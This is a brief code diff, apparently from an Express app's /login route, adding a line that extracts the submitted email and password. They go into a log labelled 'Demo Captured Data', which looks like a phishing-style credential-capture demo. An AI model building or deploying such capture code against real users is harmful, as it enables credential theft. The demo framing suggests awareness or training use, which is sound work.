@@ -14,6 +14,7 @@ app.get("/", (req, res) => {
 });
 
 app.post("/login", (req, res) => {
+  const { email, password } = req.body;
   const log = `
 === Demo Captured Data ===
 Email/Username: ${email}
